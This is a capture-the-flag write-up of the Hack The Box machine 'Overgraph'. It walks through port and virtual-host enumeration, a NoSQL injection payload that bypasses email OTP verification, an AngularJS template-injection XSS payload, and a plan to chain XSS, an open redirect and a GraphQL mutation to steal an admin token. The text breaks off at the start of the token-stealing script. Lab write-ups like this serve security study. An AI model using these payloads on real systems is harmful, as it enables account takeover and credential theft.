<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="3.1.0.745674843793">

    <!-- See retype.com -->
    <meta name="generator" content="Retype 3.1.0">

    <!-- Primary Meta Tags -->
    <title>Overgraph</title>
    <meta name="title" content="Overgraph">
    <meta name="description" content="Scan all ports open:">

    <!-- Canonical -->
    <link rel="canonical" href="https://caueb.github.io/writeups/htb/boxes/overgraph/">

    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://caueb.github.io/writeups/htb/boxes/overgraph/">
    <meta property="og:title" content="Overgraph">
    <meta property="og:description" content="Scan all ports open:">
    <meta property="og:image" content="https://caueb.github.io/writeups/htb/boxes/overgraph/images/image01.png">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://caueb.github.io/writeups/htb/boxes/overgraph/">
    <meta property="twitter:title" content="Overgraph">
    <meta property="twitter:description" content="Scan all ports open:">
    <meta property="twitter:image" content="https://caueb.github.io/writeups/htb/boxes/overgraph/images/image01.png">

    <script data-cfasync="false">(function () { var el = document.documentElement, m = localStorage.getItem("doc_theme"), wm = window.matchMedia; if (m === "dark" || (!m && wm && wm("(prefers-color-scheme: dark)").matches)) { el.classList.add("dark") } else { el.classList.remove("dark") } })();</script>

    <link href="../../../../resources/css/retype.css?v=3.1.0.745674843793" rel="stylesheet">

    <script data-cfasync="false" src="../../../../resources/js/config.js?v=3.1.0.745674843793" data-turbo-eval="false" defer></script>
    <script data-cfasync="false" src="../../../../resources/js/retype.js?v=3.1.0" data-turbo-eval="false" defer></script>
    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=3.1.0.745674843793" data-turbo-eval="false" defer></script>
    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=3.1.0.745674843793" defer></script>
</head>
<body>
    <div id="docs-app" class="relative text-base antialiased text-gray-700 bg-white font-body dark:bg-dark-850 dark:text-dark-300">
        <div class="absolute bottom-0 left-0 bg-gray-100 dark:bg-dark-800" style="top: 5rem; right: 50%"></div>
    
        <header id="docs-site-header" class="sticky top-0 z-30 flex w-full h-16 bg-white border-b border-gray-200 md:h-20 dark:bg-dark-850 dark:border-dark-650">
            <div class="container relative flex items-center justify-between pr-6 grow md:justify-start">
                <!-- Mobile menu button skeleton -->
                <button v-cloak class="skeleton docs-mobile-menu-button flex items-center justify-center shrink-0 overflow-hidden dark:text-white focus:outline-none rounded-full w-10 h-10 ml-3.5 md:hidden"><svg xmlns="http://www.w3.org/2000/svg" class="mb-px shrink-0" width="24" height="24" viewBox="0 0 24 24" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor"><path d="M2 4h20v2H2zM2 11h20v2H2zM2 18h20v2H2z"></path></g></svg></button>
                <div v-cloak id="docs-sidebar-toggle"></div>
        
                <!-- Logo -->
                <div class="flex items-center justify-between h-full py-2 md:w-75">
                    <div class="flex items-center px-2 md:px-6">
                        <a id="docs-site-logo" href="../../../../" class="flex items-center leading-snug text-2xl">
                            <span class="dark:text-white font-semibold line-clamp-1 md:line-clamp-2">Caue</span>
                        </a><span class="hidden px-2 py-1 ml-4 text-sm font-semibold leading-none text-root-logo-label-text bg-root-logo-label-bg rounded-sm md:inline-block">ctf-notes</span>
                    </div>
        
                    <span class="hidden h-8 border-r md:inline-block dark:border-dark-650"></span>
                </div>
        
                <div class="flex justify-between md:grow">
                    <!-- Top Nav -->
                    <nav class="hidden md:flex">
                        <ul class="flex flex-col mb-4 md:pl-16 md:mb-0 md:flex-row md:items-center">
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                        <g fill="currentColor">
                                            <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
                                        </g>
                                    </svg>
                                    <span>GitHub</span>
                                </a>
                            </li>
                            <li class="mr-6">
                                <a class="py-2 md:mb-0 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
                                    <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                        <g fill="currentColor">
                                            <path d="M12.876.64V.639l8.25 4.763c.541.313.875.89.875 1.515v9.525a1.75 1.75 0 0 1-.875 1.516l-8.25 4.762a1.748 1.748 0 0 1-1.75 0l-8.25-4.763a1.75 1.75 0 0 1-.875-1.515V6.917c0-.625.334-1.202.875-1.515L11.126.64a1.748 1.748 0 0 1 1.75 0Zm-1 1.298L4.251 6.34l7.75 4.474 7.75-4.474-7.625-4.402a.248.248 0 0 0-.25 0Zm.875 19.123 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474ZM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947Z"/>
                                        </g>
                                    </svg>
                                    <span>HackTheBox</span>
                                </a>
                            </li>
        
                        </ul>
                    </nav>
        
                    <!-- Header Right Skeleton -->
                    <div v-cloak class="flex justify-end grow skeleton">
        
                        <!-- Search input mock -->
                        <div class="relative hidden w-40 lg:block lg:max-w-sm lg:ml-auto">
                            <div class="absolute flex items-center justify-center h-full pl-3 dark:text-dark-300">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon-base" width="16" height="16" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 1px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                            </div>
                            <input class="w-full h-10 placeholder-gray-400 transition-colors duration-200 ease-in bg-gray-200 border border-transparent rounded md:text-sm hover:bg-white hover:border-gray-300 focus:outline-none focus:bg-white focus:border-gray-500 dark:bg-dark-600 dark:border-dark-600 dark:placeholder-dark-400" style="padding: 0.625rem 0.75rem 0.625rem 2rem" type="text" placeholder="Search">
                        </div>
        
                        <!-- Mobile search button -->
                        <div class="flex items-center justify-center w-10 h-10 lg:hidden">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="20" height="20" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><path d="M21.71 20.29l-3.68-3.68A8.963 8.963 0 0020 11c0-4.96-4.04-9-9-9s-9 4.04-9 9 4.04 9 9 9c2.12 0 4.07-.74 5.61-1.97l3.68 3.68c.2.19.45.29.71.29s.51-.1.71-.29c.39-.39.39-1.03 0-1.42zM4 11c0-3.86 3.14-7 7-7s7 3.14 7 7c0 1.92-.78 3.66-2.04 4.93-.01.01-.02.01-.02.01-.01.01-.01.01-.01.02A6.98 6.98 0 0111 18c-3.86 0-7-3.14-7-7z" ></path></g></svg>
                        </div>
        
                        <!-- Dark mode switch placeholder -->
                        <div class="w-10 h-10 lg:ml-2"></div>
        
                        <!-- History button -->
                        <div class="flex items-center justify-center w-10 h-10" style="margin-right: -0.625rem;">
                            <svg xmlns="http://www.w3.org/2000/svg" class="shrink-0 icon-base" width="22" height="22" viewBox="0 0 24 24" aria-labelledby="icon" role="presentation" style="margin-bottom: 0px;"><g fill="currentColor" ><g ><path d="M12.01 6.01c-.55 0-1 .45-1 1V12a1 1 0 00.4.8l3 2.22a.985.985 0 001.39-.2.996.996 0 00-.21-1.4l-2.6-1.92V7.01c.02-.55-.43-1-.98-1z"></path><path d="M12.01 1.91c-5.33 0-9.69 4.16-10.05 9.4l-.29-.26a.997.997 0 10-1.34 1.48l1.97 1.79c.19.17.43.26.67.26s.48-.09.67-.26l1.97-1.79a.997.997 0 10-1.34-1.48l-.31.28c.34-4.14 3.82-7.41 8.05-7.41 4.46 0 8.08 3.63 8.08 8.09s-3.63 8.08-8.08 8.08c-2.18 0-4.22-.85-5.75-2.4a.996.996 0 10-1.42 1.4 10.02 10.02 0 007.17 2.99c5.56 0 10.08-4.52 10.08-10.08.01-5.56-4.52-10.09-10.08-10.09z"></path></g></g></svg>
                        </div>
                    </div>
        
                    <div v-cloak class="flex justify-end grow">
                        <div id="docs-mobile-search-button"></div>
                        <doc-search-desktop></doc-search-desktop>
        
                        <doc-theme-switch class="lg:ml-2"></doc-theme-switch>
                        <doc-history></doc-history>
                    </div>
                </div>
            </div>
        </header>
    
        <div class="container relative flex bg-white">
            <!-- Sidebar Skeleton -->
            <div v-cloak class="fixed flex flex-col shrink-0 duration-300 ease-in-out bg-gray-100 border-gray-200 sidebar top-20 w-75 border-r h-screen md:sticky transition-transform skeleton dark:bg-dark-800 dark:border-dark-650">
            
                <!-- Render this div, if config.showSidebarFilter is `true` -->
                <div class="flex items-center h-16 px-6">
                    <input class="w-full h-8 px-3 py-2 transition-colors duration-200 ease-linear bg-white border border-gray-200 rounded shadow-none text-sm focus:outline-none focus:border-gray-600 dark:bg-dark-600 dark:border-dark-600" type="text" placeholder="Filter">
                </div>
            
                <div class="pl-6 mt-1 mb-4">
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-32 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-48 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                    <div class="w-40 h-3 mb-4 bg-gray-200 rounded-full loading dark:bg-dark-600"></div>
                </div>
            
                <div class="shrink-0 mt-auto bg-transparent dark:border-dark-650">
                    <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                        <span class="text-xs whitespace-nowrap">Powered by</span>
                        <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                    </a>
                </div>
            </div>
            
            <!-- Sidebar component -->
            <doc-sidebar v-cloak>
                <template #sidebar-footer>
                    <div class="shrink-0 mt-auto border-t md:bg-transparent md:border-none dark:border-dark-650">
            
                        <div class="py-3 px-6 md:hidden border-b dark:border-dark-650">
                            <nav>
                                <ul class="flex flex-wrap justify-center items-center">
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://github.com/caueb" target="_blank">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                <g fill="currentColor">
                                                    <symbol id="mark-github-icon-symbol" viewBox="0 0 16 16"><path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"/></symbol><use xlink:href="#mark-github-icon-symbol" />
                                                </g>
                                            </svg>
                                            <span>GitHub</span>
                                        </a>
                                    </li>
                                    <li class="mr-6">
                                        <a class="block py-1 inline-flex items-center text-sm whitespace-nowrap transition-colors duration-200 ease-linear md:text-blue-500 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-200" href="https://app.hackthebox.com/profile/78913" target="_blank">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
                                                <g fill="currentColor">
                                                    <path d="M12.876.64V.639l8.25 4.763c.541.313.875.89.875 1.515v9.525a1.75 1.75 0 0 1-.875 1.516l-8.25 4.762a1.748 1.748 0 0 1-1.75 0l-8.25-4.763a1.75 1.75 0 0 1-.875-1.515V6.917c0-.625.334-1.202.875-1.515L11.126.64a1.748 1.748 0 0 1 1.75 0Zm-1 1.298L4.251 6.34l7.75 4.474 7.75-4.474-7.625-4.402a.248.248 0 0 0-.25 0Zm.875 19.123 7.625-4.402a.25.25 0 0 0 .125-.216V7.639l-7.75 4.474ZM3.501 7.64v8.803c0 .09.048.172.125.216l7.625 4.402v-8.947Z"/>
                                                </g>
                                            </svg>
                                            <span>HackTheBox</span>
                                        </a>
                                    </li>
            
                                </ul>
                            </nav>
                        </div>
            
                        <a class="flex items-center justify-center flex-nowrap h-16 text-gray-400 dark:text-dark-400 hover:text-gray-700 dark:hover:text-dark-300 transition-colors duration-150 ease-in docs-powered-by" target="_blank" href="https://retype.com/" rel="noopener">
                            <span class="text-xs whitespace-nowrap">Powered by</span>
                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-2" fill="currentColor" width="96" height="20" overflow="visible"><path d="M0 0v20h13.59V0H0zm11.15 17.54H2.44V2.46h8.71v15.08zM15.8 20h2.44V4.67L15.8 2.22zM20.45 6.89V20h2.44V9.34z"/><g><path d="M40.16 8.44c0 1.49-.59 2.45-1.75 2.88l2.34 3.32h-2.53l-2.04-2.96h-1.43v2.96h-2.06V5.36h3.5c1.43 0 2.46.24 3.07.73s.9 1.27.9 2.35zm-2.48 1.1c.26-.23.38-.59.38-1.09 0-.5-.13-.84-.4-1.03s-.73-.28-1.39-.28h-1.54v2.75h1.5c.72 0 1.2-.12 1.45-.35zM51.56 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92h4.74v1.83h-6.79V5.36h6.64zM60.09 7.15v7.48h-2.06V7.15h-2.61V5.36h7.28v1.79h-2.61zM70.81 14.64h-2.06v-3.66l-3.19-5.61h2.23l1.99 3.45 1.99-3.45H74l-3.19 5.61v3.66zM83.99 6.19c.65.55.97 1.4.97 2.55s-.33 1.98-1 2.51-1.68.8-3.04.8h-1.23v2.59h-2.06V5.36h3.26c1.42 0 2.45.28 3.1.83zm-1.51 3.65c.25-.28.37-.69.37-1.22s-.16-.92-.48-1.14c-.32-.23-.82-.34-1.5-.34H79.7v3.12h1.38c.68 0 1.15-.14 1.4-.42zM95.85 5.36V7.2h-4.59v1.91h4.13v1.76h-4.13v1.92H96v1.83h-6.79V5.36h6.64z"/></g></svg>
                        </a>
                    </div>
                </template>
            </doc-sidebar>
    
            <div class="grow min-w-0 dark:bg-dark-850">
                <!-- Render "toolbar" template here on api pages --><!-- Render page content -->
                <div class="flex">
                    <div class="min-w-0 p-4 grow md:px-16">
                        <main class="relative pb-12 lg:pt-2">
                            <div class="docs-markdown" id="docs-content">
                                <!-- Rendered if sidebar right is enabled -->
                                <div id="docs-sidebar-right-toggle"></div>
                
                                <!-- Page content  -->
<doc-anchor-target id="overgraph" class="break-words">
    <h1>
        <doc-anchor-trigger class="header-anchor-trigger" to="#overgraph">#</doc-anchor-trigger>
        <span>Overgraph</span>
    </h1>
</doc-anchor-target>
<doc-anchor-target id="enumeration">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#enumeration">#</doc-anchor-trigger>
        <span>Enumeration</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="nmap">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#nmap">#</doc-anchor-trigger>
        <span>Nmap</span>
    </h3>
</doc-anchor-target>
<p>Scan all ports open:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -p- --min-rate=1000 -T4 10.10.11.157

Nmap scan report for 10.10.11.157
Host is up (0.27s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http</code></pre>
</doc-codeblock></div>
<p>Scan services on open ports:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ sudo nmap -sC -sV -p 22,80 10.10.11.157

Nmap scan report for 10.10.11.157
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 34:a9:bf:8f:ec:b8:d7:0e:cf:8d:e6:a2:ce:67:4f:30 (RSA)
|   256 45:e1:0c:64:95:17:92:82:a0:b4:35:7b:68:ac:4c:e1 (ECDSA)
|_  256 49:e7:c7:5e:6a:37:99:e5:26:ea:0e:eb:43:c4:88:59 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://graph.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
</doc-codeblock></div>
<p>We see that the machine is running a web server on port 80 and redirect us to <code v-pre>graph.htb</code>. Lets add the DNS entry to our <code v-pre>/etc/hosts</code> file:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">10.10.11.157    graph.htb</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="port-80">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#port-80">#</doc-anchor-trigger>
        <span>Port 80</span>
    </h3>
</doc-anchor-target>
<p>Going to <a href="http://graph.htb">http://graph.htb</a> didnt give us much information to attack. Lets run a VHOST bruteforce to check if there is anything else:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ gobuster vhost -u graph.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://graph.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/06/17 08:21:54 Starting gobuster in VHOST enumeration mode
===============================================================
Found: internal.graph.htb (Status: 200) [Size: 607]
                                                   
===============================================================
2022/06/17 08:24:12 Finished
===============================================================</code></pre>
</doc-codeblock></div>
<p>We have a new VHOST: <code v-pre>internal.graph.htb</code>
Lets add it to our <code v-pre>/etc/hosts</code> file too:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">10.10.11.157    graph.htb internal.graph.htb</code></pre>
</doc-codeblock></div>
<p>We browse to <a href="http://internal.graph.htb">http://internal.graph.htb</a> and we get a login page:
<figure class="content-center">
    <img src="images/image01.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>Default credentials don&#x27;t work.
We find the registration endpoint at <a href="http://internal.graph.htb/register">http://internal.graph.htb/register</a>:
<figure class="content-center">
    <img src="images/image02.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
As we can see, it is expecting an email from the domain <code v-pre>@graph.htb</code>.</p>
<p>When we try to register <code v-pre>test@graph.htb</code> email we can use Burp to intercept the request and see that it is making a POST request to <code v-pre>/api/code</code> in the <code v-pre>internal-api.graph.htb</code> host name:
<figure class="content-center">
    <img src="images/image03.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
Add it to the <code v-pre>/etc/hosts</code> file and try again.</p>
<p>Good! We get the response:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-json"><code v-pre class="language-json">{&quot;result&quot;:&quot;4 digit code sent to your email&quot;}</code></pre>
</doc-codeblock></div>
<p>And now what?  Decided to run gobuster in the <code v-pre>/api</code> endpoint:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ gobuster dir -u http://internal-api.graph.htb/api/ -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -m POST

===============================================================
2022/06/17 09:11:45 Starting gobuster in directory enumeration mode
===============================================================
/code                 (Status: 200) [Size: 40]
/register             (Status: 200) [Size: 36]

$ gobuster dir -u http://internal-api.graph.htb/api/ -w /usr/share/seclists/Discovery/Web-Content/api/actions-lowercase.txt -m POST

===============================================================
2022/06/17 09:13:56 Starting gobuster in directory enumeration mode
===============================================================
/register             (Status: 200) [Size: 36]
/verify               (Status: 200) [Size: 26]</code></pre>
</doc-codeblock></div>
<p>After a lot of try and error to find out how the API works I got the following:</p>
<ol>
<li>We need to send a email to <code v-pre>/code</code>, it will ask for the OTP</li>
<li>We send the OTP via <code v-pre>/verify</code> endpoint</li>
<li>After verified we can <code v-pre>/register</code> email and password</li>
</ol>
<p>The only problem was, there is no way we can get an OTP to send in the step 2. The trick here was to use NOSQL injection to bypass the code verification.</p>
<doc-anchor-target id="exploitation">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#exploitation">#</doc-anchor-trigger>
        <span>Exploitation</span>
    </h2>
</doc-anchor-target>
<doc-anchor-target id="bypass-login">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#bypass-login">#</doc-anchor-trigger>
        <span>Bypass Login</span>
    </h3>
</doc-anchor-target>
<p>First we send a POST request to <code v-pre>/api/code</code> with the email we want to login:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-json"><code v-pre class="language-json">{&quot;email&quot;:&quot;caue@graph.htb&quot;}</code></pre>
</doc-codeblock></div>
<p>Response:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-json"><code v-pre class="language-json">{&quot;result&quot;:&quot;4 digit code sent to your email&quot;}</code></pre>
</doc-codeblock></div>
<p>Then we need to send the OTP to <code v-pre>/api/verify</code> with NOSQL injection to bypass:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-json"><code v-pre class="language-json">{&quot;email&quot;:&quot;caue@graph.htb&quot;,&quot;code&quot;:{&quot;$ne&quot;:&quot;1234&quot;}}</code></pre>
</doc-codeblock></div>
<p>Response:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-json"><code v-pre class="language-json">{&quot;result&quot;:&quot;Email Verified&quot;}</code></pre>
</doc-codeblock></div>
<p>For last, we send our email and password to <code v-pre>/api/register</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-json"><code v-pre class="language-json">{&quot;email&quot;:&quot;caue@graph.htb&quot;,&quot;password&quot;:&quot;password&quot;,&quot;confirmPassword&quot;:&quot;password&quot;,&quot;username&quot;:&quot;caue&quot;}</code></pre>
</doc-codeblock></div>
<p>Response:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-json"><code v-pre class="language-json">{&quot;result&quot;:&quot;Account Created Please Login!&quot;}</code></pre>
</doc-codeblock></div>
<p>Now we can go to the login page and login with our credentials!</p>
<doc-anchor-target id="csrf---steal-admin-token">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#csrf---steal-admin-token">#</doc-anchor-trigger>
        <span>CSRF - Steal admin token</span>
    </h3>
</doc-anchor-target>
<p>As we login to the page we can see a message in the chat:
<figure class="content-center">
    <img src="images/image04.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>It seems to be the admin asking us to send a link to verify that we are a valid user from the organisation.</p>
<p>Another thing to note is that the field &quot;First Name&quot; and &quot;Last Name&quot; in the Profile page are vulnerable to XSS. We can update our first name to:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-javascript"><code v-pre class="language-javascript">{{$on.constructor('alert(&quot;XSS&quot;)')()}}</code></pre>
</doc-codeblock></div>
<p>It wil trigger the XSS:
<figure class="content-center">
    <img src="images/image05.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>An interesthing this to note is the POST request sent to <code v-pre>/graphql</code> when we update the profile:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-json"><code v-pre class="language-json">{
    &quot;operationName&quot;: &quot;update&quot;,
    &quot;variables&quot;: {
        &quot;firstname&quot;: &quot;{{$on.constructor('alert(\&quot;XSS\&quot;)')()}}&quot;,
        &quot;lastname&quot;: &quot;null&quot;,
        &quot;id&quot;: &quot;62abdc0aa77046041da68167&quot;,
        &quot;newusername&quot;: &quot;caue&quot;
    },
    &quot;query&quot;: &quot;mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {\n  update(\n    newusername: $newusername\n    id: $id\n    firstname: $firstname\n    lastname: $lastname\n  ) {\n    username\n    email\n    id\n    firstname\n    lastname\n    __typename\n  }\n}&quot;
}</code></pre>
</doc-codeblock></div>
<p>We now know that the web app is using graphql and also the syntax needed to change the profile details.
Going to <a href="http://internal-api.graph.htb/graphql">http://internal-api.graph.htb/graphql</a> we have a code playground:
<figure class="content-center">
    <img src="images/image08.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
Lets move one with enumerating the path to steal the adminToken, we will be using more of this later.</p>
<p>Looking in the JavaScript files we find the token we need to steal:
<figure class="content-center">
    <img src="images/image06.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
Its the <code v-pre>adminToken</code> from the localStorage!</p>
<p>There is another piece of the puzzle in the <a href="http://graph.htb/">http://graph.htb/</a>, an open redirect vulnerability:
<figure class="content-center">
    <img src="images/image07.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
We can use this to send the link to the admin in the chat later.</p>
<p><strong>Chaining all the vulnerabilities:</strong>
The plan is to change the admin &quot;First Name&quot; to the XSS that will send us the adminToken. As we saw previously the syntax to change the profile details requires the user ID, and the user name.
We can use the code playground at <code v-pre>/graphql</code> to retrieve the admin ID, in my case &quot;Sally&quot; user.
<figure class="content-center">
    <img src="images/image09.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>Great! Lets construct the attack:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<div class="codeblock-title">steal-admin-token.js</div>
<pre class="language-javascript"><code v-pre class="language-javascript">var request = new XMLHttpRequest();
request.open('POST','http://internal-api.graph.htb/graphql', false);
request.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain&quot;);
request.withCredentials = true;
